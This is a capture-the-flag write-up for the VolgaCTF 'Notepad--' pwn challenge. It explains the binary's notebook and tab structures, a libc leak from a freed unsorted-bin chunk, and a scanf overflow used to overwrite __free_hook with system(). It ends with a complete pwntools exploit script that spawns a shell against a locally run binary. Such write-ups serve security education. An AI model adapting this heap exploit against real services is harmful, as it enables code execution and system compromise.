# Notepad--

This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM.

Here’s the description of the challenge:

```
Notepad– is the app to store your most private notes, with an extremely
lightweight UI. Check it out!
```
We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.

## Reversing
The Notepad application presents us a menu function which looks like:

```
Welcome to Notepad--
Pick an existing notebook or create a new one
[p]ick notebook
[a]dd notebook
[d]elete notebook
[l]ist notebook
[q]uit

>
```
The structure of the notebook and tab is as follows,
```
struct notebook { char name[16];
                  int number_of_tabs;
                  struct tab tabs[64]; 
                 }

struct tabs { char name[16];
              int size;
              char* content; 
            }
```

So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1  and to try out the functionalities of tabs.

```
Operations with notebook "aaaaaaa"
[a]dd tab
[v]iew tab
[u]pdate tab
[d]elete tab
[l]ist tabs
[q]uit

>
```
This let’s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let’s move on!

## Vulnerability and the exploit

### Getting the leaks

As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here’s what I did:

- Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin

- Deleted the chunk using delete_tab functionality
- Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header).

- The allocated chunk had the first 2 0x8 bytes set to a libc pointer

- Did a view and got the leaks by calculating the offsets

Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!

### Overwriting the free_hook

The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( “%s”, name) which makes it obvious that it is prone to the classic buffer overflow! Here’s the code snippet of the add_notebook functionality:

``` C
int add_notebook()
{
__int64 v1; // rax
char *v2; // ST08_8

if ( nb_ctr == 16 )
return puts("You've reached the limit for notebooks! Delete some of the older once first!");
v1 = nb_ctr++;
v2 = (char *)&table + 2072 * v1;
printf("Enter notebook name: ");
return __isoc99_scanf("%s", v2);
}
```
Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality.

Update_tab function let’s you update any tab of the index lesser than notebook->number_of_tabs.

```
Enter index of tab to update: 1
Enter new tab name (leave empty to skip): 
Enter new data length (leave empty to keep the same): 
Enter the data:
```
And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let’s see what we can do!

- Add another note (as first one was used for the leaks) and using scanf(“%s”,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook.

- Pick that note and update tab with index 1.

- As discussed above, leave data length empty, point free_hook to system().

- Free a chunk holding the string “/bin/sh\x00” and BOOM!!!

## Exploit Code

```python
from pwn import *
 
r = process('./notepad')
# notebook functionalities
def add_note(name):
    r.sendlineafter('>','a')
    r.sendlineafter('name: ',name)
 
def pick_note(): #display items
    r.sendlineafter('>','l')
 
def dele_note(idx):
    r.sendlineafter('>','d')
    r.sendlineafter('Enter index of a notebook to delete:',str(idx))
 
def pick_note(idx):
    r.sendlineafter('>','p')
    r.sendlineafter('pick: ',str(idx))
 
#tab functionalities
def add_tab(name,length,data):
    r.sendlineafter('>','a')
    r.sendlineafter('name: ',name)
    r.sendlineafter('Enter data length (in bytes): ',str(length))
    r.sendlineafter('data: ',data)
 
def view_tab(idx):
    r.sendlineafter('>','v')
    r.sendlineafter('view: ',str(idx))
 
def list_tab():
    r.sendlineafter('>','l')
 
def update_tab(idx,name,length,data):
    r.sendlineafter('>','u')
    r.sendlineafter('update: ',str(idx))
    r.sendlineafter('skip): ',name)
    r.sendlineafter('same): ',str(length))
    r.sendlineafter('data: ',data)
 
def del_tab(idx):
    r.sendlineafter('>','d')
    r.sendlineafter('delete: ',str(idx))
def quit_tab():
    r.sendlineafter('>','q')
 
add_note('a'*0x10)
pick_note(1)
add_tab('b'*0x10,0x500, '')
add_tab('c'*0x10,0x10,'/bin/sh\x00')
del_tab(1)
add_tab('d'*0x10,0x20,'')
view_tab(2)
print(r.recvline())
rcvd = r.recvline()
leak = u64('\xd0'+rcvd[:7])
libc_base = leak - 0x3ec0d0
quit_tab()
 
#leaked pointers
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f440
 
#final exploit
sizeof_nb = 0x818
offset_tab = 0x18
offset_data = 0x18
sizeof_filler = offset_tab+offset_data-0x8
filler = b'a'*(sizeof_filler)+p64(0x30)
 
add_note(filler+p64(free_hook))
pick_note(2)
update_tab(1,'b'*0x8,'',p64(system))
 
print(hex(free_hook))
print(hex(libc_base))
 
quit_tab()
pick_note(1)
del_tab(1)
#gdb.attach(r)
r.interactive()
```
The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I’m glad I could solve it!








